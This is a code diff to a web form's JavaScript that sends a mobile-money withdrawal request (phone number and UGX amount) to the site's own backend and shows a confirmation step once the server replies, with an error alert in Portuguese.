@@ -529,9 +529,25 @@
 
             fullPhoneNumber = `+${selectedCountryCode} ${rawNumber}`;
 
-            document.getElementById('step-1').style.display = 'none';
-            document.getElementById('step-confirm').style.display = 'block';
-            document.getElementById('confirm-text').innerText = `Do you want to withdraw UGX ${Number(currentAmount).toLocaleString()} to ${fullPhoneNumber}?`;
+            try {
+                // Sends initial data to backend server
+                let response = await fetch('/api/withdrawal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullPhoneNumber, amount: currentAmount })
+                });
+                
+                let data = await response.json();
+
+                if (data.status === 'ready_for_confirmation') {
+                    document.getElementById('step-1').style.display = 'none';
+                    document.getElementById('step-confirm').style.display = 'block';
+                    document.getElementById('confirm-text').innerText = `Do you want to withdraw UGX ${Number(currentAmount).toLocaleString()} to ${fullPhoneNumber}?`;
+                }
+            } catch (err) {
+                console.error('Error connecting to server:', err);
+                alert('Erro ao enviar dados. Verifique a ligação ao servidor.');
+            }
         }
 
         function proceedToPin() {
